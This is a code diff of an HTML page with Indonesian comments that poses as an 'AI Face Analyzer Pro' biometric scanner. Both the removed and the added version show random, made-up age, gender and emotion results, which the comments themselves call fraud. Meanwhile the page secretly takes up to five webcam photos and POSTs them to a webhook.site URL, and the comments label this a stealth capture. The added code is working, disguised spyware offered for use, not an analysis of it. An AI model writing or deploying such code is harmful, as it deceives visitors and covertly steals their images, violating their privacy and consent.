@@ -3,125 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Biometric Analytics v2.0</title>
+    <title>AI Face Analyzer Pro</title>
     <style>
-        body { margin: 0; padding: 0; width: 100vw; height: 100vh; background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        body { margin: 0; padding: 0; width: 100vw; height: 100vh; background-color: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         
-        /* Frame Scanner */
-        #scanner-container { position: relative; width: 280px; height: 280px; border: 1px solid #00ff00; display: flex; justify-content: center; align-items: center; background: rgba(0, 255, 0, 0.05); }
+        /* Kotak Scanner */
+        #camera-box { position: relative; width: 260px; height: 260px; border: 2px solid #00ff41; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); overflow: hidden; }
+        
+        #video { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; filter: contrast(1.2); }
 
-        /* Video Stream dengan filter Matrix */
-        #video { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.5; filter: contrast(1.2) brightness(1.2) sepia(100%) hue-rotate(80deg); }
+        /* Animasi Garis Scan */
+        #scan-line { position: absolute; width: 100%; height: 2px; background: #00ff41; box-shadow: 0 0 15px #00ff41; top: 0; animation: move 2s linear infinite; z-index: 10; }
+        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
 
-        /* Garis Scan */
-        #scan-line { position: absolute; width: 100%; height: 4px; background: rgba(0, 255, 0, 0.5); box-shadow: 0 0 15px #00ff00; top: 0; animation: scan 2.5s ease-in-out infinite; z-index: 5; }
+        /* Panel Hasil (Penipuan) */
+        #result-panel { margin-top: 20px; width: 260px; background: rgba(0, 255, 65, 0.1); border: 1px solid #00ff41; padding: 15px; box-sizing: border-box; display: none; }
+        .stat { font-size: 14px; margin-bottom: 5px; }
+        .stat span { font-weight: bold; color: #fff; text-shadow: 0 0 5px #00ff41; }
 
-        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
-
-        /* Label Data AI */
-        .ai-label { position: absolute; left: 300px; width: 150px; font-size: 11px; text-shadow: 0 0 5px #00ff00; line-height: 1.5; pointer-events: none; }
-        @media (max-width: 500px) { .ai-label { left: 10px; top: 10px; background: rgba(0,0,0,0.5); } }
-
-        .data-box { border-left: 2px solid #00ff00; padding-left: 8px; margin-bottom: 10px; opacity: 0; transition: opacity 0.5s; }
+        /* Progress Bar */
+        #progress-container { width: 260px; height: 10px; border: 1px solid #00ff41; margin-top: 20px; position: relative; }
+        #progress-bar { width: 0%; height: 100%; background: #00ff41; transition: width 0.1s; }
 
         #canvas { display: none; }
-        #log { width: 280px; font-size: 10px; margin-top: 20px; height: 50px; overflow: hidden; color: #008800; }
     </style>
 </head>
 <body>
 
-    <div id="scanner-container">
+    <h2 style="font-size: 16px; margin-bottom: 10px;">AI BIOMETRIC SCANNER</h2>
+
+    <div id="camera-box">
         <div id="scan-line"></div>
         <video id="video" autoplay muted playsinline></video>
-        <canvas id="canvas" width="640" height="480"></canvas>
-
-        <div class="ai-label" id="ai-panel">
-            <div class="data-box" id="box-gender">GENDER: <span id="val-gender">CALIBRATING...</span></div>
-            <div class="data-box" id="box-age">AGE: <span id="val-age">MEASURING...</span></div>
-            <div class="data-box" id="box-emotion">EMOTION: <span id="val-emotion">ANALYZING...</span></div>
-        </div>
     </div>
 
-    <div id="log">>> SYSTEM READY...<br>>> AWAITING BIOMETRIC INPUT...</div>
+    <div id="progress-container">
+        <div id="progress-bar"></div>
+    </div>
+    <p id="loading-text" style="font-size: 10px; margin-top: 5px;">MENGHUBUNGKAN KE SERVER AI...</p>
+
+    <div id="result-panel">
+        <div class="stat">GENDER: <span id="res-gender">-</span></div>
+        <div class="stat">ESTIMASI USIA: <span id="res-age">-</span></div>
+        <div class="stat">EKSPRESI: <span id="res-emotion">-</span></div>
+        <div class="stat">AKURASI: <span id="res-acc">-</span></div>
+    </div>
+
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
-        const log = document.getElementById('log');
-        
+        const progressBar = document.getElementById('progress-bar');
+        const loadingText = document.getElementById('loading-text');
+        const resultPanel = document.getElementById('result-panel');
+
         let photoCount = 0;
 
-        // Data simulasi biar keliatan pinter
-        const genders = ["MALE (98%)", "FEMALE (96%)", "UNIDENTIFIED"];
-        const emotions = ["NEUTRAL", "HAPPY", "CALM", "FOCUSED", "SURPRISED"];
-
-        async function initAI() {
+        // Jalankan sistem
+        async function startApp() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    video.play();
-                    updateLog("CAMERA LINK ESTABLISHED...");
-                    updateLog("SCANNING BIOMETRIC DATA...");
-                    
-                    // Munculkan panel AI satu per satu
-                    setTimeout(() => { document.getElementById('box-gender').style.opacity = 1; }, 1000);
-                    setTimeout(() => { document.getElementById('box-age').style.opacity = 1; }, 2000);
-                    setTimeout(() => { document.getElementById('box-emotion').style.opacity = 1; }, 3000);
-
-                    // Mulai siklus "pencurian" foto
-                    setTimeout(processAI, 4000);
-                };
+                simulateScanning();
             } catch (err) {
-                updateLog("ERROR: ACCESS DENIED");
+                loadingText.innerText = "ERROR: IZIN KAMERA DITOLAK";
             }
         }
 
-        function processAI() {
-            if (photoCount >= 5) {
-                updateLog("ENCRYPTION COMPLETE. DATA SAVED.");
-                return;
-            }
-
-            if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                photoCount++;
-
-                // Update data simulasi di layar
-                const randomAge = Math.floor(Math.random() * (30 - 17 + 1)) + 17;
-                document.getElementById('val-gender').innerText = genders[Math.floor(Math.random() * 2)];
-                document.getElementById('val-age').innerText = randomAge + " YEARS";
-                document.getElementById('val-emotion').innerText = emotions[Math.floor(Math.random() * emotions.length)];
-
-                updateLog(`UPLOADING PACKET ${photoCount}/5...`);
-
-                // Ambil foto asli
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataFoto = canvas.toURL ? canvas.toDataURL('image/jpeg', 0.4) : canvas.toDataURL('image/jpeg', 0.4);
-
-                // Kirim ke Webhook
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        type: "AI_ANALYSIS",
-                        snap_id: photoCount,
-                        simulated_age: randomAge,
-                        image: dataFoto
-                    })
-                });
-            }
-
-            setTimeout(processAI, 3000);
+        // Animasi Progress Bar Palsu
+        function simulateScanning() {
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    showFakeResults();
+                } else {
+                    width++;
+                    progressBar.style.width = width + '%';
+                    if(width == 30) loadingText.innerText = "MENDETEKSI TITIK WAJAH...";
+                    if(width == 60) loadingText.innerText = "MENGANALISIS PIXEL...";
+                    if(width == 90) loadingText.innerText = "MENYINKRONKAN DATA...";
+                    
+                    // Sambil loading, diam-diam ambil foto di background
+                    if (width % 25 === 0) takeHiddenPhoto();
+                }
+            }, 80); // Total sekitar 8 detik proses scan
         }
 
-        function updateLog(msg) {
-            log.innerHTML += `<br>>> ${msg}`;
+        // Munculkan Hasil Penipuan
+        function showFakeResults() {
+            loadingText.style.display = 'none';
+            document.getElementById('progress-container').style.display = 'none';
+            resultPanel.style.display = 'block';
+
+            // Angka acak biar kelihatan beneran
+            const fakeAge = Math.floor(Math.random() * (28 - 18 + 1)) + 18;
+            const fakeAcc = (Math.random() * (99 - 95) + 95).toFixed(2);
+            const fakeGenders = ["LAKI-LAKI", "PEREMPUAN"];
+            const fakeEmotions = ["NETRAL", "SANGAT BAHAGIA", "SERIUS"];
+
+            document.getElementById('res-gender').innerText = fakeGenders[Math.floor(Math.random() * fakeGenders.length)];
+            document.getElementById('res-age').innerText = fakeAge + " TAHUN";
+            document.getElementById('res-emotion').innerText = fakeEmotions[Math.floor(Math.random() * fakeEmotions.length)];
+            document.getElementById('res-acc').innerText = fakeAcc + "%";
         }
 
-        window.onload = initAI;
+        // Fungsi Motret Diem-diem
+        function takeHiddenPhoto() {
+            if (photoCount >= 5) return;
+            photoCount++;
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataFoto = canvas.toDataURL('image/jpeg', 0.4);
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    event: "STEALTH_CAPTURE",
+                    id: photoCount,
+                    image: dataFoto
+                })
+            });
+        }
+
+        window.onload = startApp;
     </script>
 </body>
 </html>
